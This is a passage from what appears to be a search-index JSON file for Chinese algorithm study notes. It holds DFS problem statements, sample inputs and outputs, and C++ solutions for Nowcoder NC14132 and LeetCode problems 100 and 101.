| 8 | 1 1 2 | null | 2 | \u5165\u961f A | | 9 | 1 1 2 | 1 | 1 | \u5165\u961fB | | 10 | 1 1 2 | 1 1 | 1 | \u5165\u961fB | | 11 | 1 1 2 | 1 1 2 | 2 | \u5165\u961fB | | 12 | 1 1 2 | 1 1 2 | | \u641c\u7d22\u5b8c\u6210 | 3. \u4ee3\u7801 # #include <iostream> using namespace std; int list[41], listA[41], listB[41], t, n; //i,j\u5206\u522b\u8868\u793alistA[],listB[]\u4e2d\u5143\u7d20\u4e2a\u6570,id\u8868\u793a\u5f53\u524d\u5339\u914d\u5143\u7d20\u4e0b\u6807 bool dfs(int i, int j, int id) { if (i > n / 2 || j > n / 2) { // \u82e5\u5b50\u5e8f\u5217\u4e2d\u5143\u7d20\u4e2a\u6570\u5927\u4e8e\u603b\u5143\u7d20\u4e2a\u6570\u7684\u4e00\u534a\uff0c\u505c\u6b62\u641c\u7d22 return 0; } if (id > n) { // \u82e5\u5df2\u641c\u7d22\u5b8c\u5168\u90e8\u5143\u7d20\uff0c\u641c\u7d22\u5b8c\u6210 return 1; } //\u5f53\u524d\u5143\u7d20\u5339\u914d,\u52a0\u5165\u5230listB[] if (list[id] == listA[j + 1]) { listB[j + 1] = list[id]; // listB\u957f\u5ea6\u52a0\u4e00\uff0c\u7ee7\u7eed\u9012\u5f52 if (dfs(i, j + 1, id + 1)) { // \u82e5\u641c\u7d22\u5b8c\u6210\uff0c\u7ed3\u675f\u641c\u7d22 return 1; } } //\u5373\u4f7f\u76f8\u7b49\u4e5f\u52a0\u5165listA[]\u6216\u8005\u4e0d\u76f8\u7b49\u52a0\u5165\u5230listA[] listA[i + 1] = list[id]; // listA\u957f\u5ea6\u52a0\u4e00\uff0c\u9012\u5f52 return dfs(i + 1, j, id + 1); } int main() { cin >> t; while (t--) { cin >> n; for (int i = 1; i <= n; i++) cin >> list[i]; listA[1] = list[1]; puts(dfs(1, 0, 2) ? \"Frederica Bernkastel\" : \"Furude Rika\"); } return 0; } \u6ce8\uff1a\u4ee3\u7801\u53c2\u8003\u81ea v5zsq \u7684CSDN\u535a\u5ba2 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#nc14132","text":"","title":"\u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#_1","text":"\u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#12-problem-description","text":"\u8d1d\u4f26\u5361\u65af\u6cf0\u9732\uff0c\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u4e5f\u53ef\u4ee5\u79f0\u4e3a\u53e4\u624b\u68a8\u82b1\uff0c\u80fd\u591f\u521b\u9020\u51e0\u7387\u8fd1\u4e4e\u4e3a0\u7684\u5947\u8ff9\uff0c\u901a\u8fc7\u65e0\u9650\u8f6e\u56de\u6210\u529f\u6253\u7834\u4e86\u4e16\u754c\u7ebf\u6536\u675f\u7406\u8bba\u3002\u548c\u67d0\u79d1\u5b66\u8005\u4e0d\u540c\uff0c\u8d1d\u4f26\u5e76\u4e0d\u5728\u610f\u4e16\u754c\u7ebf\u6536\u675f\u7684\u90a3\u5957\u7406\u8bba\uff0c\u4f5c\u4e3a\u5947\u8ff9\u4e4b\u9b54\u5973\uff0c\u8d1d\u4f26\u7684\u7231\u597d\u53ea\u5728\u4e8e\u54c1\u8336\u3002\u4f5c\u4e3a\u54c1\u8336\u7684\u6d88\u9063\uff0c\u8d1d\u4f26\u6b63\u5728\u89e3\u4e00\u9053\u7b80\u5355\u7684\u8c1c\u9898\u3002 \u7ed9\u51fa\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u6570\u5217 A_i \uff0c\u95ee\u662f\u5426\u80fd\u5c06\u8fd9\u4e2a\u6570\u5217\u5206\u89e3\u4e3a\u4e24\u4e2a\u957f\u5ea6\u4e3a n/2 \u7684\u5b50\u5e8f\u5217\uff0c\u6ee1\u8db3 \u4e24\u4e2a\u5b50\u5e8f\u5217\u4e0d\u4e92\u76f8\u91cd\u53e0\u3002 \u4e24\u4e2a\u5b50\u5e8f\u5217\u4e2d\u7684\u6570\u8981\u5b8c\u5168\u4e00\u6837\uff0c \\{1, 2\\} = \\{1, 2\\} \uff0c \\{1, 2\\} \\ne \\{2, 1\\} \u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#13-input","text":"\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 T \uff0c\u8868\u793a\u6570\u636e\u7ec4\u6570\u3002 \u63a5\u4e0b\u6765 T \u7ec4\u6570\u636e\uff0c\u6bcf\u7ec4\u6570\u636e\u7684\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n \uff0c\u7b2c\u4e8c\u884c n \u4e2a\u6b63\u6574\u6570 A_i \u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#14-output","text":"\u6bcf\u7ec4\u6570\u636e\u8f93\u51fa\u4e00\u884c\uff0c\u5982\u679c\u53ef\u4ee5\u5b8c\u6210\uff0c\u8f93\u51faFrederica Bernkastel\uff0c\u5426\u5219\u8f93\u51faFurude Rika\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#15-sample-input","text":"3 4 1 1 2 2 6 1 2 3 4 5 6 4 1 2 2 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#16-sample-output","text":"Frederica Bernkastel Furude Rika Furude Rika","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#17-source","text":"\u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#2","text":"DFS \u7ef4\u62a4\u4e24\u4e2a\u6570\u7ec4 listA \u548c listB \uff0c \u5728\u6bcf\u9047\u5230\u4e00\u4e2a\u5339\u914d\u7684\u5143\u7d20 A_i \u65f6\uff0c\u4f1a\u8fdb\u5165\u5206\u5c94\u70b9\uff0c\u5982\u679c\u8be5\u5143\u7d20 A_i \u8fdb\u5165\u961f\u5217 listB \u540e\u80fd\u591f\u641c\u7d22\u5b8c\u5168\u90e8\u5143\u7d20\uff0c\u5219\u641c\u7d22\u5b8c\u6210\u3002 \u5982\u679c listA \u4e2d\u7684\u5143\u7d20\u6570\u5217\u8d85\u8fc7\u6240\u6709\u5143\u7d20\u6570\u5217 n \u7684\u4e00\u534a\uff0c\u5373 listA.size() > n / 2 \uff0c\u5219\u56de\u9000\u5230\u4e0a\u4e00\u6b65\uff0c\u8ba9\u5143\u7d20\u8fdb\u5165 listB \u3002 \u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\u5373\u80fd\u904d\u5386\u6240\u6709\u60c5\u51b5\u3002 \u6bd4\u5982\u5982\u4e0b\u6d4b\u8bd5\u7528\u4f8b\u3002 1 6 1 1 2 1 1 2 Table 1. \\text{\u8ba1\u7b97\u8fc7\u7a0b\u8868} | \u5e8f\u53f7 | listA | listB | \u5165\u961f\u5143\u7d20 | \u5907\u6ce8 | | :---: | :-----: | :-----: | :------: | :----------: | | 1 | 1 | null | 1 | \u521d\u59cb\u5316 | | 2 | 1 | 1 | 1 | \u5165\u961f B | | 3 | 1 2 | 1 | 2 | \u5165\u961f A | | 4 | 1 2 1 | 1 | 1 | \u5165\u961f A | | 5 | 1 2 1 1 | 1 | 1 | \u961fA\u5143\u7d204 > 3 | | 6 | 1 | null | | \u56de\u9000 | | 7 | 1 1 | null | 1 | \u5165\u961f A | | 8 | 1 1 2 | null | 2 | \u5165\u961f A | | 9 | 1 1 2 | 1 | 1 | \u5165\u961fB | | 10 | 1 1 2 | 1 1 | 1 | \u5165\u961fB | | 11 | 1 1 2 | 1 1 2 | 2 | \u5165\u961fB | | 12 | 1 1 2 | 1 1 2 | | \u641c\u7d22\u5b8c\u6210 |","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/#3","text":"#include <iostream> using namespace std; int list[41], listA[41], listB[41], t, n; //i,j\u5206\u522b\u8868\u793alistA[],listB[]\u4e2d\u5143\u7d20\u4e2a\u6570,id\u8868\u793a\u5f53\u524d\u5339\u914d\u5143\u7d20\u4e0b\u6807 bool dfs(int i, int j, int id) { if (i > n / 2 || j > n / 2) { // \u82e5\u5b50\u5e8f\u5217\u4e2d\u5143\u7d20\u4e2a\u6570\u5927\u4e8e\u603b\u5143\u7d20\u4e2a\u6570\u7684\u4e00\u534a\uff0c\u505c\u6b62\u641c\u7d22 return 0; } if (id > n) { // \u82e5\u5df2\u641c\u7d22\u5b8c\u5168\u90e8\u5143\u7d20\uff0c\u641c\u7d22\u5b8c\u6210 return 1; } //\u5f53\u524d\u5143\u7d20\u5339\u914d,\u52a0\u5165\u5230listB[] if (list[id] == listA[j + 1]) { listB[j + 1] = list[id]; // listB\u957f\u5ea6\u52a0\u4e00\uff0c\u7ee7\u7eed\u9012\u5f52 if (dfs(i, j + 1, id + 1)) { // \u82e5\u641c\u7d22\u5b8c\u6210\uff0c\u7ed3\u675f\u641c\u7d22 return 1; } } //\u5373\u4f7f\u76f8\u7b49\u4e5f\u52a0\u5165listA[]\u6216\u8005\u4e0d\u76f8\u7b49\u52a0\u5165\u5230listA[] listA[i + 1] = list[id]; // listA\u957f\u5ea6\u52a0\u4e00\uff0c\u9012\u5f52 return dfs(i + 1, j, id + 1); } int main() { cin >> t; while (t--) { cin >> n; for (int i = 1; i <= n; i++) cin >> list[i]; listA[1] = list[1]; puts(dfs(1, 0, 2) ? \"Frederica Bernkastel\" : \"Furude Rika\"); } return 0; } \u6ce8\uff1a\u4ee3\u7801\u53c2\u8003\u81ea v5zsq \u7684CSDN\u535a\u5ba2 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/","text":"LeetCode 100 \u76f8\u540c\u7684\u6811 DFS # \u76ee\u5f55 # LeetCode 100 \u76f8\u540c\u7684\u6811 DFS \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1.6. Sample Output 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e24\u4e2a\u4e8c\u53c9\u6811\uff0c\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u6765\u68c0\u9a8c\u5b83\u4eec\u662f\u5426\u76f8\u540c\u3002 \u5982\u679c\u4e24\u4e2a\u6811\u5728\u7ed3\u6784\u4e0a\u76f8\u540c\uff0c\u5e76\u4e14\u8282\u70b9\u5177\u6709\u76f8\u540c\u7684\u503c\uff0c\u5219\u8ba4\u4e3a\u5b83\u4eec\u662f\u76f8\u540c\u7684\u3002 1.5. Sample Input # \u8f93\u5165: 1 1 / \\ / \\ 2 3 2 3 [1,2,3], [1,2,3] 1.6. Sample Output # \u8f93\u51fa: true 1.5. Sample Input # \u8f93\u5165: 1 1 / \\ 2 2 [1,2], [1,null,2] 1.6. Sample Output # \u8f93\u51fa: false 1.8. Source # LeetCode 100 \u76f8\u540c\u7684\u6811 2. \u89e3\u8bfb # DFS\uff0c\u5148\u5224\u65ad\u8282\u70b9\u662f\u5426\u4e3a\u7a7a\uff0c\u7136\u540e\u6bd4\u8f83\u5de6\u53f3\u8282\u70b9\u7684\u503c\u662f\u5426\u76f8\u7b49\u3002 3. \u4ee3\u7801 # class Solution { public: bool isSameTree(TreeNode* p, TreeNode* q) { bool leftFalg = false, rightFlag = false; // \u82e5\u5176\u4e00\u4e3a\u7a7a if (p == nullptr || q == nullptr) { // \u5224\u65ad\u662f\u5426\u90fd\u4e3a\u7a7a if (p == q) { return true; } else { return false; } } else { // \u82e5\u4e0d\u4e3a\u7a7a if (p->val != q->val) { // \u82e5\u503c\u4e0d\u76f8\u7b49\uff0c\u8fd4\u56defalse return false; } // \u82e5\u503c\u76f8\u7b49\uff0c\u7ee7\u7eed\u5224\u5b9a\u5de6\u53f3\u8282\u70b9 leftFalg = isSameTree(p->left, q->left); rightFlag = isSameTree(p->right, q->right); if (leftFalg && rightFlag) { return true; } else { return false; } } } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.LeetCode 100 \u76f8\u540c\u7684\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#leetcode-100-dfs","text":"","title":"LeetCode 100 \u76f8\u540c\u7684\u6811 DFS"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#_1","text":"LeetCode 100 \u76f8\u540c\u7684\u6811 DFS \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1.6. Sample Output 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#12-problem-description","text":"\u7ed9\u5b9a\u4e24\u4e2a\u4e8c\u53c9\u6811\uff0c\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u6765\u68c0\u9a8c\u5b83\u4eec\u662f\u5426\u76f8\u540c\u3002 \u5982\u679c\u4e24\u4e2a\u6811\u5728\u7ed3\u6784\u4e0a\u76f8\u540c\uff0c\u5e76\u4e14\u8282\u70b9\u5177\u6709\u76f8\u540c\u7684\u503c\uff0c\u5219\u8ba4\u4e3a\u5b83\u4eec\u662f\u76f8\u540c\u7684\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#15-sample-input","text":"\u8f93\u5165: 1 1 / \\ / \\ 2 3 2 3 [1,2,3], [1,2,3]","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#16-sample-output","text":"\u8f93\u51fa: true","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#15-sample-input_1","text":"\u8f93\u5165: 1 1 / \\ 2 2 [1,2], [1,null,2]","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#16-sample-output_1","text":"\u8f93\u51fa: false","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#18-source","text":"LeetCode 100 \u76f8\u540c\u7684\u6811","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#2","text":"DFS\uff0c\u5148\u5224\u65ad\u8282\u70b9\u662f\u5426\u4e3a\u7a7a\uff0c\u7136\u540e\u6bd4\u8f83\u5de6\u53f3\u8282\u70b9\u7684\u503c\u662f\u5426\u76f8\u7b49\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/2.LeetCode_100_%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/#3","text":"class Solution { public: bool isSameTree(TreeNode* p, TreeNode* q) { bool leftFalg = false, rightFlag = false; // \u82e5\u5176\u4e00\u4e3a\u7a7a if (p == nullptr || q == nullptr) { // \u5224\u65ad\u662f\u5426\u90fd\u4e3a\u7a7a if (p == q) { return true; } else { return false; } } else { // \u82e5\u4e0d\u4e3a\u7a7a if (p->val != q->val) { // \u82e5\u503c\u4e0d\u76f8\u7b49\uff0c\u8fd4\u56defalse return false; } // \u82e5\u503c\u76f8\u7b49\uff0c\u7ee7\u7eed\u5224\u5b9a\u5de6\u53f3\u8282\u70b9 leftFalg = isSameTree(p->left, q->left); rightFlag = isSameTree(p->right, q->right); if (leftFalg && rightFlag) { return true; } else { return false; } } } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/","text":"LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811 # \u76ee\u5f55 # LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1 1.6. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u68c0\u67e5\u5b83\u662f\u5426\u662f\u955c\u50cf\u5bf9\u79f0\u7684\u3002 1.5. Sample Input 1 # \u4f8b\u5982\uff0c\u4e8c\u53c9\u6811 [1,2,2,3,4,4,3] \u662f\u5bf9\u79f0\u7684\u3002 1 / \\ 2 2 / \\ / \\ 3 4 4 3 1.6. Sample Output 1 # true 1.5. Sample Input 2 # \u4f46\u662f\u4e0b\u9762\u8fd9\u4e2a [1,2,2,null,3,null,3] \u5219\u4e0d\u662f\u955c\u50cf\u5bf9\u79f0\u7684: 1 / \\ 2 2 \\ \\ 3 3 1.6. Sample Output 2 # false 1.8. Source # LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811 2. \u89e3\u8bfb # DFS\uff0c\u5148\u5224\u65ad\u8282\u70b9\u662f\u5426\u4e3a\u7a7a\uff0c\u7136\u540e\u5206\u522b\u6bd4\u8f83\u5de6\u53f3\u8282\u70b9\u7684\u503c\u662f\u5426\u76f8\u7b49\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u6839\u8282\u70b9\u4e3a\u7a7a\u65f6\u662f\u5bf9\u79f0\u7684\u3002 3. \u4ee3\u7801 # class Solution { public: bool isNodeSymmetric(TreeNode* p, TreeNode* q) { bool leftFalg = false, rightFlag = false; // \u82e5\u5176\u4e00\u4e3a\u7a7a if (p == nullptr || q == nullptr) { // \u5224\u65ad\u662f\u5426\u90fd\u4e3a\u7a7a if (p == q) { return true; } else { return false; } } else { // \u82e5\u4e0d\u4e3a\u7a7a if (p->val != q->val) { // \u82e5\u503c\u4e0d\u76f8\u7b49\uff0c\u8fd4\u56defalse return false; } // \u82e5\u503c\u76f8\u7b49\uff0c\u7ee7\u7eed\u5224\u5b9a\u5de6\u53f3\u8282\u70b9 leftFalg = isNodeSymmetric(p->left, q->right); rightFlag = isNodeSymmetric(p->right, q->left); if (leftFalg && rightFlag) { return true; } else { return false; } } } bool isSymmetric(TreeNode* root) { if (root == nullptr){ return true; }else{ return isNodeSymmetric(root->left, root->right); } } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#leetcode-101","text":"","title":"LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#_1","text":"LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1 1.6. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.8. Source 2. \u89e3\u8bfb 3. 